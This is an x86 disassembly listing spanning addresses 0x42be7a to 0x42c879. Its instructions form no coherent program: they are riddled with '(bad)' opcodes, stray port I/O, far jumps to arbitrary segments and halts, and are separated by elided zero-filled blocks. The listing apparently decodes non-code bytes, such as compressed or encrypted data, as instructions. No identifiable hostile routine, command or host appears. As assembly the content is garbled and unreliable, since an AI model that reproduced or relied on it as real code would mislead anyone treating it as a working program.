  42be7a:	gs aam 0xa
  42be7d:	adc    esp,DWORD PTR gs:[ebp+ecx*1+0x18d3d4f4]
  42be85:	xor    eax,0x91825add
  42be8a:	jl     0x42be63
  42be8c:	test   eax,0x5b082ae5
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bf34
  42bf01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf02:	(bad)  [edi+0x1d6dc]
  42bf08:	add    eax,0x1
  42bf0d:	sar    cl,cl
  42bf0f:	dec    edx
  42bf10:	pop    ebx
  42bf11:	pop    edx
  42bf12:	adc    DWORD PTR [edx],edx
  42bf14:	jae    0x42bf43
  42bf16:	movnti DWORD PTR [edx],eax
  42bf19:	mov    ch,0xce
  42bf1b:	lahf   
  42bf1c:	das    
  42bf1d:	(bad)  
  42bf1f:	jl     0x42bf10
  42bf21:	jno    0x42bf5f
  42bf23:	das    
  42bf24:	aam    0xc0
  42bf26:	stos   BYTE PTR es:[edi],al
  42bf27:	hlt    
  42bf28:	inc    esi
  42bf29:	cwde   
  42bf2a:	adc    eax,0xa35a01a2
  42bf2f:	pop    ds
  42bf30:	push   0xe34200f5
  42bf35:	sub    edx,ebp
  42bf37:	mov    ebp,0xb7646c9
  42bf3c:	fs nop
  42bf3e:	jmp    0x53b:0x675e3597
  42bf45:	imul   eax,DWORD PTR [edi],0xdbe99979
  42bf4b:	out    0xe6,al
  42bf4d:	je     0x42bf18
  42bf4f:	jmp    0x42bf3c
  42bf51:	push   es
  42bf52:	jno    0x42bfb8
  42bf54:	std    
  42bf55:	inc    edx
  42bf56:	rol    esp,cl
  42bf58:	sbb    edx,edi
  42bf5a:	icebp  
  42bf5b:	jbe    0x42bf92
  42bf5d:	aas    
  42bf5e:	shr    DWORD PTR [eax-0x5ae378f6],cl
  42bf64:	and    eax,0x51612952
  42bf69:	cmp    bh,BYTE PTR [ebx+0x23dc127e]
  42bf6f:	jno    0x42bfa9
  42bf71:	add    al,0x3f
  42bf73:	xor    dh,BYTE PTR [ecx+ebx*8]
  42bf76:	out    dx,al
  42bf77:	aam    0x37
  42bf79:	in     eax,0x7d
  42bf7b:	sbb    DWORD PTR [edx-0x47],ecx
  42bf7e:	xchg   esi,eax
  42bf7f:	and    DWORD PTR [esi-0x72],esi
  42bf82:	outs   dx,DWORD PTR ds:[esi]
  42bf83:	xchg   BYTE PTR ds:0xa0ca5ca1,bh
  42bf89:	jo     0x42bf74
  42bf8b:	dec    edi
  42bf8c:	popf   
  42bf8d:	outs   dx,DWORD PTR ds:[esi]
  42bf8e:	jmp    0x7bc8452c
  42bf93:	push   esp
  42bf94:	js     0x42bf39
  42bf96:	and    DWORD PTR [edi+0x3c],ebp
  42bf99:	stos   DWORD PTR es:[edi],eax
  42bf9a:	popa   
  42bf9b:	jp     0x42bf2c
  42bf9d:	cli    
  42bf9e:	sbb    al,0x99
  42bfa0:	daa    
  42bfa1:	jb     0x42bf6f
  42bfa3:	iret   
  42bfa4:	test   eax,0x9c8c544b
  42bfa9:	(bad)  
  42bfaa:	jo     0x42bfeb
  42bfac:	xor    ebx,DWORD PTR [ebx+ecx*4-0x29f6f9a7]
  42bfb3:	and    DWORD PTR [edi-0x7c],eax
  42bfb6:	jb     0x42c032
  42bfb8:	mov    edi,0xc40cb6c3
  42bfbd:	ins    BYTE PTR es:[edi],dx
  42bfbe:	add    dl,dl
  42bfc0:	mov    dh,0xf
  42bfc2:	and    al,0xb2
  42bfc4:	pop    ebx
  42bfc5:	inc    esp
  42bfc6:	mov    esp,0xf3c7b6ca
  42bfcb:	mov    dl,BYTE PTR [esi]
  42bfcd:	mov    eax,0x1258f4b2
  42bfd2:	popf   
  42bfd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfd4:	mov    ds:0xb7373f9e,al
  42bfd9:	sub    DWORD PTR [esi-0x45],esi
  42bfdc:	dec    ecx
  42bfdd:	xor    eax,0x684a7fb9
  42bfe2:	enter  0x4015,0x79
  42bfe6:	icebp  
  42bfe7:	sbb    DWORD PTR [edx],0xc58c7b3f
  42bfed:	call   WORD PTR [ecx-0x1d]
  42bff1:	add    eax,0x38d6312a
  42bff6:	fmul   QWORD PTR [ebx+0x29]
  42bff9:	mov    WORD PTR [ebx],?
  42bffb:	js     0x42c01a
  42bffd:	shl    DWORD PTR ds:0x83cfc980,cl
  42c003:	dec    eax
  42c004:	inc    esi
  42c005:	les    edx,FWORD PTR [ecx]
  42c007:	gs push edi
  42c009:	rol    BYTE PTR [esp+edi*4],1
  42c00c:	aaa    
  42c00d:	retf   0x1a0a
  42c010:	fiadd  DWORD PTR [eax]
	...
  42c072:	add    BYTE PTR [eax],al
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	dec    edx
  42c081:	inc    esi
  42c082:	pop    esp
  42c083:	or     al,0xe1
  42c085:	xlat   BYTE PTR ds:[ebx]
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0xb4000001
  42c08d:	xor    DWORD PTR [ebp-0x16fd379f],0xffc0496c
  42c097:	mov    esi,0x342981bd
  42c09c:	fisubr WORD PTR ds:0xe84240ff
  42c0a2:	sti    
  42c0a3:	jne    0x42c069
  42c0a5:	xchg   ecx,eax
  42c0a6:	lods   al,BYTE PTR ds:[esi]
  42c0a7:	ret    0x6539
  42c0aa:	loopne 0x42c04b
  42c0ac:	cdq    
  42c0ad:	ret    0xad6e
  42c0b0:	sub    edi,esi
  42c0b2:	xchg   edi,eax
  42c0b3:	scas   al,BYTE PTR es:[edi]
  42c0b4:	jge    0x42c061
  42c0b6:	sub    eax,0x72afa8ab
  42c0bb:	mov    BYTE PTR [ebx-0x55],ah
  42c0be:	xchg   edx,eax
  42c0bf:	fld    TBYTE PTR [edi]
  42c0c1:	test   eax,0x8af28227
  42c0c6:	fnstsw WORD PTR [ebp-0x23b71004]
  42c0cc:	mov    DWORD PTR [ecx+edx*4+0x60bedbca],esi
  42c0d3:	and    eax,0x94622730
  42c0d8:	xor    bl,BYTE PTR [ebx+0x22899189]
  42c0de:	fld    TBYTE PTR [ebx+eiz*2+0x483b4816]
  42c0e5:	mov    DWORD PTR [edi],edi
  42c0e7:	and    dl,BYTE PTR [esi]
  42c0e9:	xchg   BYTE PTR [eax+ebx*8],bl
  42c0ec:	shr    DWORD PTR [edi-0x1c],cl
  42c0ef:	pop    esi
  42c0f0:	xor    eax,0x3dccfb9c
  42c0f5:	fld    QWORD PTR [ebp+0x5dbdcf20]
  42c0fb:	cwde   
  42c0fc:	push   cs
  42c0fd:	jo     0x42c0c9
  42c0ff:	sti    
  42c100:	repz or dh,BYTE PTR [esi-0x1a230484]
  42c107:	push   0xa4fcc22b
  42c10c:	xor    bl,BYTE PTR [edi-0x4cee2267]
  42c112:	in     al,0x8a
  42c114:	test   BYTE PTR [edi],dl
  42c116:	shl    DWORD PTR ds:0x54ecd870,cl
  42c11c:	je     0x42c10f
  42c11e:	adc    eax,DWORD PTR [esi-0x76d318ff]
  42c124:	xchg   edx,eax
  42c125:	mov    ebp,0x8f33aef1
  42c12a:	and    al,0xf3
  42c12c:	out    0xe5,eax
  42c12e:	aaa    
  42c12f:	not    DWORD PTR [ebp-0x7485bb04]
  42c135:	add    BYTE PTR [esi],ch
  42c137:	mov    ecx,0xd60bce3f
  42c13c:	popa   
  42c13d:	mov    ds:0xf3b8e4c8,eax
  42c142:	xchg   edx,eax
  42c143:	loop   0x42c11c
  42c145:	clc    
  42c146:	pusha  
  42c147:	iret   
  42c148:	aas    
  42c149:	aam    0xbd
  42c14b:	daa    
  42c14c:	int3   
  42c14d:	sub    eax,0x8faa5053
  42c152:	fmul   st(7),st
  42c154:	or     BYTE PTR [esi],cl
  42c156:	sbb    dl,bh
  42c158:	pusha  
  42c159:	push   edx
  42c15a:	pop    eax
  42c15b:	mov    WORD PTR [eax],?
  42c15d:	jne    0x42c0e7
  42c15f:	imul   eax,DWORD PTR [ebp-0xf22398d],0x1a
  42c166:	xor    bl,BYTE PTR [ebp+0x61ef81fb]
  42c16c:	loop   0x42c181
  42c16e:	enter  0x87ef,0xe1
  42c172:	mov    WORD PTR [eax],fs
  42c174:	shl    DWORD PTR [ebp-0x33],0x93
  42c178:	sbb    edx,ebp
  42c17a:	rcr    DWORD PTR [ecx-0x44],0xe9
  42c17e:	test   al,0x1d
  42c180:	addr16 in eax,dx
  42c182:	jp     0x42c1ae
  42c184:	and    al,dh
  42c186:	js     0x42c178
  42c188:	xchg   ebx,eax
  42c189:	inc    edi
  42c18a:	in     eax,dx
  42c18b:	pop    es
  42c18c:	sbb    BYTE PTR [esi-0x72],0xa4
  42c190:	mov    ecx,0x0
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	xor    al,0xc
  42c202:	mov    ah,0xec
  42c204:	out    0xd8,al
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    eax,0xeb000001
  42c20d:	sub    al,0xc8
  42c20f:	mov    bh,0x74
  42c211:	loop   0x42c230
  42c213:	icebp  
  42c214:	daa    
  42c215:	and    BYTE PTR [eax-0xa],cl
  42c218:	ret    0xac8e
  42c21b:	mov    DWORD PTR [eax],edx
  42c21d:	mov    eax,ds:0x70e89761
  42c222:	jmp    0x5d007bb8
  42c227:	xlat   BYTE PTR ds:[ebx]
  42c228:	mov    al,0xc9
  42c22a:	inc    edx
  42c22b:	dec    ebx
  42c22c:	pop    ecx
  42c22d:	cs and bl,0xc4
  42c231:	dec    eax
  42c232:	xchg   edx,eax
  42c233:	fs xchg ebp,eax
  42c235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c236:	arpl   WORD PTR [edx],di
  42c238:	enter  0x4fdb,0xa2
  42c23c:	add    BYTE PTR [ecx+0x29cc6edc],0xef
  42c243:	xchg   BYTE PTR [edi+0x2e10e5b9],bh
  42c249:	int    0x0
  42c24b:	les    ecx,FWORD PTR [ebx-0x2f]
  42c24e:	aad    0xee
  42c250:	in     al,dx
  42c251:	push   eax
  42c252:	mov    dl,0xb8
  42c254:	mov    ss,WORD PTR [ebx+0x3e46e54a]
  42c25a:	xor    BYTE PTR [ecx-0x268ea484],ah
  42c260:	fisubr WORD PTR [edx+0x6b]
  42c263:	leave  
  42c264:	cmp    al,0xc1
  42c266:	cvtpi2ps xmm0,QWORD PTR [ecx+0x55]
  42c26a:	lock mov ch,0x6e
  42c26d:	fmulp  st(0),st
  42c26f:	add    BYTE PTR [ebx],bh
  42c271:	cmp    al,0x6f
  42c273:	sub    al,0xdd
  42c275:	gs aas 
  42c277:	hlt    
  42c278:	test   BYTE PTR [edx+ebp*1-0x49],dh
  42c27c:	mov    eax,DWORD PTR [ebx+0x67]
  42c27f:	fild   QWORD PTR ds:0x7cb697d8
  42c285:	push   ss
  42c286:	xchg   DWORD PTR [esi],edi
  42c288:	imul   BYTE PTR cs:[edx+0x31]
  42c28c:	iret   
  42c28d:	dec    ebp
  42c28e:	mov    ebp,0xbdea69e9
  42c293:	sub    al,0xc0
  42c295:	cld    
  42c296:	mov    ebx,0x2da30053
  42c29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c29c:	repz (bad) 
  42c29e:	ins    DWORD PTR es:[edi],dx
  42c29f:	sub    eax,0x78e28a63
  42c2a4:	lds    ebx,FWORD PTR [esi]
  42c2a6:	and    BYTE PTR [eax+0x57d1b4f5],al
  42c2ac:	dec    edx
  42c2ad:	or     eax,0x58bf44b6
  42c2b2:	xor    ch,cl
  42c2b4:	call   0x3be5:0x7685c421
  42c2bb:	aaa    
  42c2bc:	not    ch
  42c2be:	(bad)
  42c2c2:	fisttp WORD PTR [ebx+0x1bbad5ff]
  42c2c8:	pushf  
  42c2c9:	sbb    ecx,esi
  42c2cb:	pop    ebp
  42c2cc:	fmul   DWORD PTR [edx]
  42c2ce:	cmp    ch,BYTE PTR [esi-0x29]
  42c2d1:	lods   eax,DWORD PTR ds:[esi]
  42c2d2:	fisttp DWORD PTR [ecx+0x6]
  42c2d5:	bnd addr16 jae 0x42c2d3
  42c2d9:	cwde   
  42c2da:	and    ch,BYTE PTR [edx-0x3d80b51a]
  42c2e0:	stos   BYTE PTR es:[edi],al
  42c2e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2e2:	stos   BYTE PTR es:[edi],al
  42c2e3:	das    
  42c2e4:	sub    al,0x9e
  42c2e6:	sub    BYTE PTR [ebx],bh
  42c2e8:	dec    edi
  42c2e9:	jge    0x42c32c
  42c2eb:	push   esi
  42c2ec:	rol    DWORD PTR [edx+0x2a],cl
  42c2ef:	add    eax,0x927e135
  42c2f4:	dec    edi
  42c2f5:	mov    bh,0xcd
  42c2f7:	push   ecx
  42c2f8:	cmp    eax,0x394f889d
  42c2fd:	jnp    0x42c2fb
  42c2ff:	add    BYTE PTR [eax+0x4e],cl
  42c302:	mov    ecx,0xa5c38beb
  42c307:	mov    cl,0xea
  42c309:	ficomp DWORD PTR [ecx+0xf]
  42c30c:	sbb    DWORD PTR [ebx],edx
  42c30e:	push   edx
  42c30f:	dec    ebp
  42c310:	mov    esi,0x0
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x2b6379f6
  42c383:	imul   ebp,ebx,0xffffffd9
  42c386:	add    DWORD PTR [eax],eax
  42c388:	add    eax,0xde000001
  42c38d:	sbb    BYTE PTR [ebp+0x7d0f22d7],ch
  42c393:	xchg   ebx,eax
  42c394:	es jge 0x42c403
  42c397:	sub    al,0x1f
  42c399:	and    BYTE PTR [edi+edi*8-0x37],0xbc
  42c39e:	push   0x7ab43e98
  42c3a3:	loopne 0x42c393
  42c3a5:	aam    0xf4
  42c3a7:	leave  
  42c3a8:	std    
  42c3a9:	test   eax,0xe7a58bfa
  42c3ae:	sbb    cl,BYTE PTR [ecx+0x5bcf9119]
  42c3b4:	sub    cl,bl
  42c3b6:	pop    ecx
  42c3b7:	in     eax,dx
  42c3b8:	stos   BYTE PTR es:[edi],al
  42c3b9:	jo     0x42c3d1
  42c3bb:	aad    0x18
  42c3bd:	and    edi,ebp
  42c3bf:	mov    ?,WORD PTR [esi+edi*8+0x61663ed9]
  42c3c6:	(bad)  
  42c3c7:	in     al,0xe9
  42c3c9:	cmp    DWORD PTR [edi+0x52],ebx
  42c3cc:	inc    ebp
  42c3cd:	mov    ebx,0x1e04d647
  42c3d2:	sub    al,0x7f
  42c3d4:	adc    eax,0xa183a590
  42c3d9:	xchg   ebp,eax
  42c3da:	sbb    ah,BYTE PTR [esi-0x72]
  42c3dd:	hlt    
  42c3de:	mov    ds:0x2ee13ff4,al
  42c3e3:	add    edx,0xd724155c
  42c3e9:	jge    0x42c400
  42c3eb:	mov    DWORD PTR [edx-0x4330d3cd],eax
  42c3f1:	and    bh,BYTE PTR fs:[edx+0x3025a177]
  42c3f8:	add    ebx,DWORD PTR [edx+ebp*1]
  42c3fb:	push   ebx
  42c3fc:	int    0xd9
  42c3fe:	xchg   ebp,eax
  42c3ff:	jge    0x42c3c8
  42c401:	sub    DWORD PTR [ecx],0xfae2f58a
  42c407:	or     cl,dh
  42c409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c40a:	popf   
  42c40b:	int3   
  42c40c:	repnz lock hlt 
  42c40f:	out    dx,al
  42c410:	jge    0x42c452
  42c412:	push   edx
  42c413:	sub    al,0xa3
  42c415:	retf   
  42c416:	pop    ebx
  42c417:	and    DWORD PTR [edi],eax
  42c419:	aas    
  42c41a:	inc    eax
  42c41b:	fstp   TBYTE PTR [ebx]
  42c41d:	shl    DWORD PTR [esp+edi*4],1
  42c420:	sub    DWORD PTR [ebx],esi
  42c422:	jmp    0x42c40d
  42c424:	cmp    DWORD PTR [ebx-0x3a],edx
  42c427:	rcl    DWORD PTR [esi+0x9],1
  42c42a:	stos   DWORD PTR es:[edi],eax
  42c42b:	mov    ah,0x2a
  42c42d:	xor    ch,BYTE PTR [ebx-0x5a]
  42c430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c431:	jb     0x42c478
  42c433:	aaa    
  42c434:	pushf  
  42c435:	xor    BYTE PTR ds:0x2913cda3,bh
  42c43b:	adc    eax,0x78647072
  42c440:	int    0xa6
  42c442:	xchg   ebp,eax
  42c443:	or     dl,BYTE PTR [edi+0x6a]
  42c446:	and    BYTE PTR [ecx+0x18],dh
  42c449:	jge    0x42c419
  42c44b:	into   
  42c44c:	ja     0x42c441
  42c44e:	mul    DWORD PTR [eax+eiz*8+0x229738ca]
  42c455:	scas   al,BYTE PTR es:[edi]
  42c456:	mov    bl,0x47
  42c458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c459:	jno    0x42c433
  42c45b:	mov    dl,0x70
  42c45d:	ins    BYTE PTR es:[edi],dx
  42c45e:	out    dx,eax
  42c45f:	mov    edi,DWORD PTR [ebp-0x6a]
  42c462:	xchg   edx,eax
  42c463:	xor    al,0x68
  42c465:	mov    eax,ds:0x69bcf2bb
  42c46a:	mov    dl,0x3e
  42c46c:	jno    0x42c4ab
  42c46e:	lods   eax,DWORD PTR ds:[esi]
  42c46f:	ins    DWORD PTR es:[edi],dx
  42c470:	push   cs
  42c471:	fcomp  DWORD PTR [ecx]
  42c473:	sub    ebp,DWORD PTR [eax]
  42c475:	fild   QWORD PTR [edi-0x2df55b8e]
  42c47b:	loop   0x42c439
  42c47d:	mov    ds:0xd6b00668,al
  42c482:	(bad)  
  42c483:	and    BYTE PTR [ecx+0xdbe0d1b],al
  42c489:	sub    esi,DWORD PTR [eax+0x73]
  42c48c:	daa    
  42c48d:	cmp    al,0xb
  42c48f:	inc    edx
  42c490:	mov    al,ds:0x0
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x1234,0xa5
  42c502:	fcmovb st,st(6)
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0xce000001,al
  42c50d:	repnz (bad) 
  42c510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c511:	dec    edx
  42c512:	mov    dl,0x1c
  42c514:	and    esi,DWORD PTR [edi+0x3146dd5b]
  42c51a:	aad    0x3f
  42c51c:	ret    0xd2ba
  42c51f:	ins    BYTE PTR es:[edi],dx
  42c520:	repnz mov ebx,0xc2e1fe43
  42c526:	or     eax,0xff42aa06
  42c52b:	test   BYTE PTR [esp+esi*2+0x3],al
  42c52f:	add    eax,0x23b8ca87
  42c534:	inc    ebp
  42c535:	popa   
  42c536:	aaa    
  42c537:	push   ebp
  42c538:	stos   DWORD PTR es:[edi],eax
  42c539:	adc    dh,BYTE PTR [edi-0x6d61b01f]
  42c53f:	aad    0xfe
  42c541:	jno    0x42c5b6
  42c543:	scas   al,BYTE PTR es:[edi]
  42c544:	pop    ss
  42c545:	call   0xf9f0:0xce6642d8
  42c54c:	and    DWORD PTR [ecx],0xffffffc5
  42c54f:	inc    ecx
  42c550:	and    ch,BYTE PTR [edi+0x619c277e]
  42c556:	push   eax
  42c557:	push   es
  42c558:	(bad)  
  42c559:	ret    
  42c55a:	fsubr  DWORD PTR [ebx+0x7a]
  42c55d:	ds rcr esi,cl
  42c560:	mov    ds,WORD PTR [edx-0x7b]
  42c563:	lock into 
  42c565:	aaa    
  42c566:	cmp    ecx,edi
  42c568:	dec    esp
  42c569:	push   ebx
  42c56a:	push   DWORD PTR [ecx-0x73]
  42c56d:	or     al,0x2c
  42c56f:	(bad)  
  42c570:	and    al,0x9e
  42c572:	push   edi
  42c573:	push   esp
  42c574:	sbb    DWORD PTR [esi+eiz*8-0x5d],edi
  42c578:	sahf   
  42c579:	pop    es
  42c57a:	xlat   BYTE PTR ds:[ebx]
  42c57b:	in     al,0x60
  42c57d:	push   eax
  42c57e:	sbb    DWORD PTR [edx],edi
  42c580:	mov    ah,0x4f
  42c582:	mov    eax,ds:0x7f900ea2
  42c587:	pop    esi
  42c588:	sub    eax,0x43e3bef
  42c58d:	icebp  
  42c58e:	xchg   DWORD PTR [ebx-0x80],esi
  42c591:	loop   0x42c575
  42c593:	pop    ds
  42c594:	dec    edx
  42c595:	jae    0x42c5c0
  42c597:	fidiv  WORD PTR [ebp-0x56e71b1a]
  42c59d:	xchg   esp,eax
  42c59e:	mov    gs,WORD PTR [edx+edi*1-0x77]
  42c5a2:	repnz ins BYTE PTR es:[edi],dx
  42c5a4:	mov    BYTE PTR [esi+0x40],dl
  42c5a7:	jb     0x42c545
  42c5a9:	lahf   
  42c5aa:	cmp    BYTE PTR [esi+0x49053f46],cl
  42c5b0:	mov    ebx,0xd0857ee1
  42c5b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5b6:	fisttp WORD PTR [eax-0x28863005]
  42c5bc:	ds retf 0xc3a1
  42c5c0:	ror    DWORD PTR [edx-0x70],1
  42c5c3:	mov    ch,0xd2
  42c5c5:	fwait
  42c5c6:	push   ecx
  42c5c7:	mov    al,0xcf
  42c5c9:	fadd   QWORD PTR [esi+eiz*2+0x2c]
  42c5cd:	jbe    0x42c5b2
  42c5cf:	or     cl,dl
  42c5d1:	sub    eax,0xf465073b
  42c5d6:	clc    
  42c5d7:	call   0xfd86:0xc9139318
  42c5de:	outs   dx,BYTE PTR ds:[esi]
  42c5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c5e0:	and    esi,DWORD PTR [ecx+0x3d]
  42c5e3:	nop
  42c5e4:	fnstcw WORD PTR [eax]
  42c5e6:	lahf   
  42c5e7:	inc    esi
  42c5e8:	push   cs
  42c5e9:	pop    ebp
  42c5ea:	sbb    al,0x4d
  42c5ec:	cdq    
  42c5ed:	lods   al,BYTE PTR ds:[esi]
  42c5ee:	pop    es
  42c5ef:	fiadd  DWORD PTR [esi+0x35b1cec]
  42c5f5:	rol    BYTE PTR [esi+0x2a],cl
  42c5f8:	shr    DWORD PTR [edx-0x60],1
  42c5fb:	imul   eax,esi,0xb67922ee
  42c601:	add    edi,DWORD PTR [edx]
  42c603:	cs jnp 0x42c640
  42c606:	fsubr  DWORD PTR [edx+eiz*2-0x36]
  42c60a:	fs push es
  42c60c:	pop    ecx
  42c60d:	retf   
  42c60e:	rol    BYTE PTR [edx],1
  42c610:	cmp    eax,DWORD PTR [eax]
	...
  42c672:	add    BYTE PTR [eax],al
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0xb6dfc6b]
  42c681:	ds or  al,0xa3
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0xe0000001,al
  42c68d:	cmp    al,0x2c
  42c68f:	je     0x42c706
  42c691:	icebp  
  42c692:	pop    eax
  42c693:	aad    0xd7
  42c695:	rcl    BYTE PTR [edx],cl
  42c697:	mov    eax,ds:0x5be0149b
  42c69c:	inc    ecx
  42c69d:	bound  esi,QWORD PTR [eax-0x1d]
  42c6a0:	adc    al,0xfc
  42c6a2:	or     BYTE PTR [ebx+esi*1-0xbd43311],cl
  42c6a9:	ja     0x42c688
  42c6ab:	xchg   BYTE PTR [ebp-0x1a766bca],ch
  42c6b1:	add    eax,0xdb0cdf79
  42c6b6:	push   ebp
  42c6b7:	popf   
  42c6b8:	jg     0x42c66e
  42c6ba:	aaa    
  42c6bb:	xchg   ebx,eax
  42c6bc:	xor    DWORD PTR [eax-0x62],0xd6799b5e
  42c6c3:	push   0xf1e15e86
  42c6c8:	clc    
  42c6c9:	pop    ebp
  42c6ca:	cmp    al,0xd9
  42c6cc:	mov    ebp,0x98aa8819
  42c6d1:	xchg   edx,eax
  42c6d2:	lods   eax,DWORD PTR ds:[esi]
  42c6d3:	add    ebx,DWORD PTR [ecx+eiz*8-0x52]
  42c6d7:	push   cs
  42c6d8:	dec    esi
  42c6d9:	jmp    0x606e:0x3df91845
  42c6e0:	sbb    BYTE PTR [ebx],ch
  42c6e2:	ror    bl,cl
  42c6e4:	call   0x6f438666
  42c6e9:	cmp    dl,BYTE PTR [eax]
  42c6eb:	in     eax,0xe3
  42c6ed:	mov    ecx,0x13cb9335
  42c6f2:	daa    
  42c6f3:	mov    bh,0x2b
  42c6f5:	aam    0x5f
  42c6f7:	or     ah,cl
  42c6f9:	mov    DWORD PTR [edi+eiz*8],ebx
  42c6fc:	outs   dx,DWORD PTR ds:[esi]
  42c6fd:	cmp    DWORD PTR [esi+0x7f],ebp
  42c700:	test   BYTE PTR [edi-0x2e],bh
  42c703:	xor    ebp,ecx
  42c705:	ret    0x1555
  42c708:	pop    es
  42c709:	out    dx,eax
  42c70a:	inc    ebp
  42c70b:	push   es
  42c70c:	mov    WORD PTR [ecx+0x304aadf6],ds
  42c712:	outs   dx,DWORD PTR ds:[esi]
  42c713:	xchg   ebx,eax
  42c714:	pop    esi
  42c715:	adc    cl,BYTE PTR [esi+0x5f]
  42c718:	xor    esi,DWORD PTR [esi-0x4c]
  42c71b:	adc    BYTE PTR [eax-0xa],al
  42c71e:	jnp    0x42c74b
  42c720:	cmp    ch,BYTE PTR [ebx-0x21]
  42c723:	jl     0x42c793
  42c725:	push   ds
  42c726:	loope  0x42c784
  42c728:	pop    ebp
  42c729:	jmp    0x99d4:0xd98bc43e
  42c730:	in     eax,dx
  42c731:	aad    0xe1
  42c733:	mov    cl,0x48
  42c735:	(bad)  
  42c736:	call   0xedffd5da
  42c73b:	mov    ds,esp
  42c73d:	into   
  42c73e:	push   esp
  42c73f:	push   ebx
  42c740:	or     eax,0x8a58d469
  42c745:	mov    bh,0x91
  42c747:	push   ss
  42c748:	lods   eax,DWORD PTR ds:[esi]
  42c749:	pop    es
  42c74a:	mov    ds:0x6db7fd61,al
  42c74f:	push   edi
  42c750:	and    esi,DWORD PTR [edi]
  42c752:	jle    0x42c6ef
  42c754:	inc    edx
  42c755:	sub    al,0xca
  42c757:	hlt    
  42c758:	out    dx,eax
  42c759:	(bad)  
  42c75a:	ss das 
  42c75c:	add    bl,BYTE PTR [ecx]
  42c75e:	mov    gs,WORD PTR [eax-0x1c]
  42c761:	add    edi,0xffffff9e
  42c764:	idiv   DWORD PTR [edx+0x290e1bc7]
  42c76a:	inc    eax
  42c76b:	jae    0x42c6f2
  42c76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c76e:	mov    dh,0x9
  42c770:	mov    ch,0xae
  42c772:	mov    edi,DWORD PTR [edx-0x63]
  42c775:	push   ds
  42c776:	inc    eax
  42c777:	and    al,0x89
  42c779:	cli    
  42c77a:	pop    ebp
  42c77b:	in     al,0xd6
  42c77d:	mov    bh,0xf2
  42c77f:	push   es
  42c780:	xchg   esp,eax
  42c781:	and    BYTE PTR [ecx],0x89
  42c784:	ror    BYTE PTR [edx-0x56],cl
  42c787:	jno    0x42c752
  42c789:	loop   0x42c798
  42c78b:	adc    eax,0xa5448be8
  42c790:	jne    0x42c792
	...
  42c7f2:	add    BYTE PTR [eax],al
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	pop    esi
  42c801:	and    al,BYTE PTR [eax+0x11]
  42c804:	cli    
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x1c000001,al
  42c80d:	aaa    
  42c80e:	arpl   WORD PTR gs:[eax-0x7f],bx
  42c812:	inc    ecx
  42c813:	scas   eax,DWORD PTR es:[edi]
  42c814:	call   0xfb9a2bc9
  42c819:	mov    ds:0x9eaf708b,eax
  42c81e:	mov    edx,0xa1b8448c
  42c823:	pop    ds
  42c824:	arpl   si,ax
  42c826:	fs aam 0x65
  42c829:	xchg   esi,eax
  42c82a:	push   ecx
  42c82b:	js     0x42c80c
  42c82d:	jno    0x42c89c
  42c82f:	int    0x60
  42c831:	fstp   TBYTE PTR [ecx-0x654bda30]
  42c837:	out    0x66,al
  42c839:	dec    ebx
  42c83a:	pusha  
  42c83b:	mov    al,ds:0xe9e7e321
  42c840:	dec    eax
  42c841:	push   0xffffffbb
  42c843:	inc    edx
  42c844:	cmp    cl,bl
  42c846:	das    
  42c847:	test   eax,0x5e61b573
  42c84c:	fwait
  42c84d:	adc    eax,0xbf2066da
  42c852:	pop    ds
  42c853:	mov    ds:0x6e970e01,al
  42c858:	add    BYTE PTR [eax+0x130c4a9e],ch
  42c85e:	sti    
  42c85f:	aad    0x32
  42c861:	mov    ds:0xba47fd8,al
  42c866:	and    BYTE PTR [esi+eiz*2+0x57e5b341],0x26
  42c86e:	or     al,BYTE PTR [eax]
  42c870:	add    al,0xa0
  42c872:	push   cs
  42c873:	or     BYTE PTR [edx+0x7f],ah
  42c876:	addr16 jne 0x42c82a
  42c879:	repnz dec ecx
